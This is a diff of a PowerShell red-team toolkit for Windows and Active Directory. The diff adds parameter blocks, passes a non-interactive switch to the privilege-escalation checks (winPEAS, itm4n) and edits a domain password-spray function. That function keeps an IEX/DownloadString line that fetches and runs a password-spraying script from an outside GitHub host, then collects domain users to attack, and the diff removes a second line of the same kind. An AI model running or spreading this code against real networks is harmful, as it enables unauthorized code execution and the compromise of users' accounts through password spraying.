@@ -2322,6 +2322,14 @@ function GPOAudit
         License: BSD 3-Clause
     #>
     #Domain Recon
+        [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     # todo interactive + consoleoutput
@@ -2332,6 +2340,14 @@ function GPOAudit
 
 function reconAD
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+
     # sense-of-security - ADRecon
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -2986,10 +3002,10 @@ __        ___       ____
         }
         elseif($noninteractive -and $consoleoutput)
         {
-            itm4nprivesc -consoleoutput
-            winPEAS -consoleoutput
-            oldchecks -consoleoutput
-            otherchecks -consoleoutput
+            itm4nprivesc -noninteractive -consoleoutput
+            winPEAS -noninteractive -consoleoutput
+            oldchecks -noninteractive -consoleoutput
+            otherchecks -noninteractive -consoleoutput
             return
         }
 
@@ -3106,9 +3122,7 @@ function domainpassspray
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
-    $domain_Name = Get-NetDomain
-    $Domain = $domain_Name.Name
+    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
 	
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
